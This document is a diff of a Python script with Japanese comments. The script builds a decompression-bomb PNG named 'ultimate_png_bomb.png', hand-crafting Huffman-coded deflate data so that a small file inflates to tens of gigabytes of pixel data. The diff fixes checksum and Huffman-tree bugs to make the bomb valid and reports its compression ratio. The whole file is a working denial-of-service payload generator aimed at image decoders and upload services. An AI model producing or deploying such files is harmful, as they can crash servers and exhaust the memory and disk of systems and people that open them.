@@ -1,6 +1,7 @@
 import struct
 import binascii
 import zlib
+import time
 
 # =========================================================
 # 【ユーザー設定エリア】
@@ -8,36 +9,34 @@ import zlib
 # =========================================================
 
 # 1. 画像のサイズ (ピクセル単位)
+# 例: 10万 x 10万 で 約30GB〜60GB の生データを生成
 WIDTH = 100000
 HEIGHT = 100000
 
 # 2. PNGカラーフォーマット設定
-# COLOR_TYPE: 0=Grayscale, 2=RGB, 3=Indexed, 4=Gray+Alpha, 6=RGBA
+# 0=Grayscale, 2=Truecolor(RGB), 3=Indexed, 4=Gray+Alpha, 6=RGBA
 COLOR_TYPE = 2
 
 # 3. ビット深度 (1, 2, 4, 8, 16)
-# ※COLOR_TYPEによって許可される深度はPNG仕様に依存します
+# ※ COLOR_TYPE に合わせた有効な深度を指定してください
 BIT_DEPTH = 8
 
 # 4. 単色、または繰り返すパターンのバイト列
-# 【単色ベタ塗りの例】
-# 真っ赤なRGBの場合: b'\xff\x00\x00'
-# 半透明の黒RGBAの場合: b'\x00\x00\x00\x80'
-#
-# 【繰り返しパターンの例】
-# 青と黄色の縦縞(RGB)の場合: b'\x00\x00\xff\xff\xff\x00'
+# 例1: 真っ赤なRGB b'\xff\x00\x00'
+# 例2: 2バイトパターン b'\xff\x00' (RGBに流し込むと激しい模様になる)
+# 例3: 日本語のUTF-8 "こんにちは".encode('utf-8')
 PATTERN_BYTES = b'\xff\x00\x00'
 
 # 5. Indexedカラー(COLOR_TYPE=3)の場合のパレット設定
-# 使わない場合は空のままでOKです
+# 使わない場合は空のままでOK
 PALETTE = b'' 
 
-OUTPUT_FILENAME = "ultimate_pattern_bomb.png"
+# 出力ファイル名
+OUTPUT_FILENAME = "ultimate_png_bomb.png"
 # =========================================================
 
-
 class FastBitWriter:
-    """ビット単位の出力を高速に行うためのライター"""
+    """ビット単位の出力を超高速に行うためのライター"""
     def __init__(self):
         self.val = 0
         self.bits = 0
@@ -96,7 +95,7 @@ def combine_adler32(adler1, adler2, len2):
     a2 = adler2 & 0xffff
     b2 = (adler2 >> 16) & 0xffff
     a = (a1 + a2 - 1) % BASE
-    b = (b1 + b2 - len2 + a1 * len2) % BASE
+    b = (b1 + b2 - len2 + a1 * (len2 % BASE)) % BASE
     return (b << 16) | a
 
 def adler32_pow(adler, length, count):
@@ -106,9 +105,9 @@ def adler32_pow(adler, length, count):
     while count > 0:
         if count & 1:
             res_adler = combine_adler32(res_adler, base_adler, base_len)
-            res_len += base_len
+            res_len = (res_len + base_len) % 65521
         base_adler = combine_adler32(base_adler, base_adler, base_len)
-        base_len *= 2
+        base_len = (base_len * 2) % 65521
         count >>= 1
     return res_adler
 
@@ -119,17 +118,15 @@ def write_chunk(f, chunk_type, data):
     f.write(struct.pack('>I', binascii.crc32(data, binascii.crc32(chunk_type)) & 0xffffffff))
 
 def generate():
+    t_start = time.time()
+    
     # 1行あたりのバイト数を計算
     channels = {0: 1, 2: 3, 3: 1, 4: 2, 6: 4}[COLOR_TYPE]
     bytes_per_row = (WIDTH * channels * BIT_DEPTH + 7) // 8
-    
-    # ---------------------------------------------------------
-    # [準備] O(1)での超高速Adler-32計算
-    # ---------------------------------------------------------
     P = len(PATTERN_BYTES)
-    # 1行目: Noneフィルタ(0x00) + パターン
+    
+    # Adler-32のO(1)計算
     row1_data = bytearray([0x00]) + (PATTERN_BYTES * (bytes_per_row // P + 1))[:bytes_per_row]
-    # 2行目以降: Upフィルタ(0x02) + 0x00の連続 (完全に差分がゼロになる)
     row2_data = bytearray([0x02]) + bytearray(bytes_per_row)
     
     a1 = zlib.adler32(row1_data)
@@ -143,18 +140,15 @@ def generate():
     bw = FastBitWriter()
     
     # ---------------------------------------------------------
-    # 【ブロック1】 1行目 (固定ハフマン)
-    # ここで距離Pを使ったパターンの無限コピーを発動させる
+    # 【ブロック1】 1行目 (固定ハフマン + 距離Pコピー)
     # ---------------------------------------------------------
-    bw.write(0, 1) # BFINAL = 0 (まだ続く)
+    bw.write(0, 1) # BFINAL = 0
     bw.write(1, 2) # BTYPE = 01 (Fixed Huffman)
     
-    # リテラル出力用クロージャ
     def write_lit(val):
         bw.write(rev_bits(48 + val, 8) if val <= 143 else rev_bits(400 + val - 144, 9), 8 if val <= 143 else 9)
 
     write_lit(0x00) # Noneフィルタ
-    
     d_code, d_extra_bits, d_extra_val = get_dist_info(P)
     
     if bytes_per_row <= P:
@@ -164,29 +158,34 @@ def generate():
         rem_len = bytes_per_row - P
         n258, rem = rem_len // 258, rem_len % 258
         
-        # 距離P、長さ258で爆速コピー
         for _ in range(n258):
             bw.write(rev_bits(197, 8), 8) # 長さ258
             bw.write(rev_bits(d_code, 5), 5) # 距離P
             if d_extra_bits > 0: bw.write(d_extra_val, d_extra_bits)
-            
-        for i in range(rem): write_lit(PATTERN_BYTES[i % P])
+        
+        # 【修正箇所1】 端数(rem)のインデックスのズレを完璧に調整
+        start_idx = (n258 * 258) % P
+        for i in range(rem): 
+            write_lit(PATTERN_BYTES[(start_idx + i) % P])
         
     bw.write(rev_bits(0, 7), 7) # EOB
 
     # ---------------------------------------------------------
-    # 【ブロック2】 2行目以降 (動的ハフマン)
-    # 辞書を極限チューニングし「2ビット=258バイト」状態を作り出す
+    # 【ブロック2】 2行目以降 (動的ハフマン極限チューニング)
     # ---------------------------------------------------------
     if HEIGHT > 1:
-        bw.write(1, 1)  # BFINAL = 1 (最後のブロック)
-        bw.write(2, 2)  # BTYPE = 10 (Dynamic Huffman)
+        bw.write(1, 1) # BFINAL = 1
+        bw.write(2, 2) # BTYPE = 10 (Dynamic Huffman)
         bw.write(29, 5) # HLIT = 29
-        bw.write(1, 5)  # HDIST = 1
+        bw.write(1, 5) # HDIST = 1
         bw.write(14, 4) # HCLEN = 14
         
-        # 必要なコード長だけ指定
-        cl_lens = [0]*18; cl_lens[16]=2; cl_lens[17]=2; cl_lens[13]=2; cl_lens[2]=2
+        # 【修正箇所2】 ツリーが「完全二分木」になるよう長さを定義
+        cl_lens = [0]*18
+        cl_lens[3] = 2   # sym 0
+        cl_lens[17] = 2  # sym 1
+        cl_lens[13] = 2  # sym 3
+        cl_lens[2] = 2   # sym 18
         for i in range(18): bw.write(cl_lens[i], 3)
         
         def write_cl(sym, ex=0, ex_b=0):
@@ -195,17 +194,19 @@ def generate():
             elif sym == 3: bw.write(1, 2)
             elif sym == 18: bw.write(3, 2); bw.write(ex, ex_b)
 
-        write_cl(3)                # 0x00 -> 長さ3
-        write_cl(0)                # 0x01 使わない
-        write_cl(3)                # 0x02 -> 長さ3
-        write_cl(18, 127, 7)       # 不要なシンボルを削ぎ落とす
-        write_cl(18, 104, 7)       
-        write_cl(3)                # 256(EOB) -> 長さ3
-        write_cl(18, 17, 7)        
-        write_cl(1)                # 285(Len258) -> 長さ1 (最強)
-        write_cl(1); write_cl(1)   # Dist0, 1 -> 長さ1 (最強)
+        write_cl(3)                # 0x00
+        write_cl(0)                # 0x01
+        write_cl(3)                # 0x02
+        write_cl(18, 127, 7)       # 3..140
+        write_cl(18, 104, 7)       # 141..255
+        write_cl(3)                # 256 (EOB)
+        write_cl(3)                # 257 (ツリー完全化のためのダミー)
+        write_cl(18, 16, 7)        # 258..284
+        write_cl(1)                # 285 (Length 258)
 
-        # H-1行分の書き込み (メモリ消費ゼロ)
+        write_cl(1)                # Dist 0
+        write_cl(1)                # Dist 1
+
         n258_w = (bytes_per_row - 1) // 258
         rem_w = (bytes_per_row - 1) % 258
         
@@ -213,7 +214,7 @@ def generate():
             bw.write(5, 3) # 0x02 リテラル
             if bytes_per_row > 0:
                 bw.write(1, 3) # 0x00 リテラル
-                bw.write_zeros(n258_w * 2) # 2ビットで258バイトのゼロ生成×数万回
+                bw.write_zeros(n258_w * 2) # 2ビットで258バイトのゼロを錬成
                 for _ in range(rem_w): bw.write(1, 3)
         
         bw.write(3, 3) # EOB
@@ -222,7 +223,7 @@ def generate():
     zlib_stream = b'\x78\xda' + deflate_data + struct.pack('>I', final_adler)
 
     # ---------------------------------------------------------
-    # 【出力】 PNG組み立て
+    # 【出力】 PNGの書き出し
     # ---------------------------------------------------------
     with open(OUTPUT_FILENAME, 'wb') as f:
         f.write(b'\x89PNG\r\n\x1a\n')
@@ -232,11 +233,11 @@ def generate():
         write_chunk(f, b'IDAT', zlib_stream)
         write_chunk(f, b'IEND', b'')
         
+    t_end = time.time()
     raw_size = HEIGHT * (bytes_per_row + 1)
-    print(f"[{OUTPUT_FILENAME}] 生成完了！")
-    print(f"フォーマット: ColorType={COLOR_TYPE}, BitDepth={BIT_DEPTH}")
+    print(f"[{OUTPUT_FILENAME}] 生成完了！ (処理時間: {t_end - t_start:.2f}秒)")
     print(f"解凍後生データ量: 約 {raw_size / (1024**3):.4f} GB")
-    print(f"極限圧縮後サイズ: {len(zlib_stream)} Bytes")
+    print(f"極限圧縮後サイズ: {len(zlib_stream) / (1024**2):.2f} MB")
     print(f"実効圧縮率: 約 {raw_size / len(zlib_stream):.1f} 倍")
 
 if __name__ == "__main__":
